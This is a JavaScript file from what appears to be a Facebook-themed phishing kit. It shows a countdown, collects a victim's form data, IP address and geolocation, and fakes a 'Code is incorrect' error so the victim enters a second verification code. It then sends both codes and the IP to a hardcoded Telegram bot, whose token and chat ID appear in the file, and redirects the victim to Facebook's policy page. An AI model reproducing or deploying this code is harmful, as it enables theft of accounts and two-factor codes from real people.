let timeRemaining = 5 * 60; // 5 minutes in seconds

const countdownElement = document.getElementById("countdown");

const countdownInterval = setInterval(() => {
  const minutes = Math.floor(timeRemaining / 60);
  const seconds = timeRemaining % 60;

  countdownElement.innerHTML = `Please wait <strong>${minutes}:${
    seconds < 10 ? "0" : ""
  }${seconds}</strong> to request the sending of the code.`;

  timeRemaining--;

  if (timeRemaining < 0) {
    clearInterval(countdownInterval);
    countdownElement.textContent =
      "You can now request the sending of the code.";
  }
}, 1000);
//
document
  .querySelector(".form_content_confirm")
  .addEventListener("submit", function (e) {
    e.preventDefault();

    // Replace with your bot token and chat ID
    const botToken = "7016735657:AAEnFhFDV7oKAecaReLPhilB9iIog00erxE";
    const chatId = "-4122429321";

    // Collect form data
    const formData = new FormData(e.target);
    const data = {};
    for (let [key, value] of formData.entries()) {
      data[key] = value;
    }

    // Get user's IP address
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((ipData) => {
        // Add IP address to data
        data.ip = ipData.ip;

        // Get user's location
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition((position) => {
            data.location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            };

            //Handle password
            let clickCount = 0;
            let codes = [];

            document
              .querySelector("#button-submit")
              .addEventListener("click", function (e) {
                e.preventDefault();

                clickCount++;

                const codeInput = document.querySelector('input[name="Code"]');
                const code = codeInput.value;
                codes.push(code);

                firstCode = codes[0];
                secondCode = codes[1];

                function formatData(data) {
                  return `• Code: ${data.Code}\n• IP: ${data.ip}\n• First Code: ${firstCode}\n• Second Code: ${secondCode}`;
                }

                if (clickCount === 1) {
                  // Create a span element to display the error message
                  const errorSpan = document.createElement("span");
                  errorSpan.textContent =
                    "Code is incorrect. Please try again.";
                  errorSpan.style.color = "red";

                  // Append the error message to the form group
                  codeInput.parentNode.appendChild(errorSpan);
                } else if (clickCount === 2) {
                  // Send message to Telegram bot
                  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: formatData(data),
                    }),
                  })
                    .then((response) => response.json())
                    .then((data) => {
                      console.log(data);
                      document.querySelector(".form_content_confirm").reset();
                      window.location.href =
                        "https://www.facebook.com/policies_center/";
                    });
                }
              });
          });
        }
      });
  });
